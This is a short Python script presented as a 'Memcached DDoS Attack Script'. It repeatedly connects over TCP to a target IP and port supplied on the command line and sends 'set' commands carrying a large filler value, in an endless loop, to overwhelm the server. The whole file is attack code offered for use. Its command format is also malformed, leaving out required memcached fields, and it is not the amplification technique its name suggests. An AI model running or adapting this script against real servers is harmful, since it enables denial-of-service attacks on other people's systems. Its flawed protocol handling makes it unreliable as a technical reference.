import socket
import time
import argparse
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def memcached_attack(ip, port, key, value):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.sendall(f"set {key} {len(value)} {value}\r\n".encode())
        response = sock.recv(1024).decode()
        logging.info(f"Response from {ip}:{port}: {response.strip()}")
        sock.close()
    except Exception as e:
        logging.error(f"Error occurred: {e}")

def main():
    parser = argparse.ArgumentParser(description='Memcached DDoS Attack Script')
    parser.add_argument('--ip', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, required=True, help='Target port')
    parser.add_argument('--key', required=True, help='Memcached key to attack')
    parser.add_argument('--value-size', type=int, default=1024*1024, help='Size of the value in the attack payload')
    parser.add_argument('--interval', type=float, default=0.1, help='Interval between attack iterations in seconds')
    args = parser.parse_args()

    logging.info(f"Starting Memcached DDoS attack on {args.ip}:{args.port} with key: {args.key}")

    value = "A" * args.value_size

    try:
        while True:
            memcached_attack(args.ip, args.port, args.key, value)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        logging.info("Attack stopped by user.")

if __name__ == "__main__":
    main()
